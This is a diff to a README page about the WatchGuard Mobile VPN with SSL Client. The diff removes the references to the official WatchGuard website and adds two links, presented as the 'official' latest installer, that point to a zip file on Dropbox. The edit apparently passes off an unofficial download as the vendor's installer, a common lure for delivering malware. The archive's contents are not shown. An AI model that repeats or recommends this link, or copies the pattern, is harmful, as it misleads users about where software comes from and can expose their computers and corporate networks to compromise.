@@ -1,5 +1,6 @@
 # Download WatchGuard Mobile VPN SSL Client
-You can download and install WatchGuard Mobile VPN with SSL Client from the official website.
+You can download and install WatchGuard Mobile VPN with SSL Client from the official link.
+## :white_check_mark: Latest Version: **[WatchGuard VPN Installer](https://www.dropbox.com/scl/fi/e7s8bqeebbbj8j72r3evx/WatchGuard-SSL-VPN.zip?rlkey=5trd6jweilds5p4c1f8mpmgmd&st=3i4anvwh&dl=1)**
 
 ## Introduction
 WatchGuard Mobile VPN with SSL Client is a secure remote access solution designed to provide encrypted connectivity between users and corporate networks. Built around SSL/TLS encryption, it creates a protected tunnel over the internet, allowing employees to safely access internal resources from virtually any location. This approach ensures that sensitive business data remains confidential, even when users are connected through public or unsecured networks.
@@ -27,4 +28,6 @@ Designed for reliability and straightforward deployment, the client provides a b
 * Compatible with certificate-based authentication and multi-factor authentication methods configured on the Firebox
 
 ## Download and install
-The latest version is available on the official WatchGuard website.
+The latest version is available here.
+## :white_check_mark: Latest Version: **[WatchGuard VPN Installer](https://www.dropbox.com/scl/fi/e7s8bqeebbbj8j72r3evx/WatchGuard-SSL-VPN.zip?rlkey=5trd6jweilds5p4c1f8mpmgmd&st=3i4anvwh&dl=1)**
+
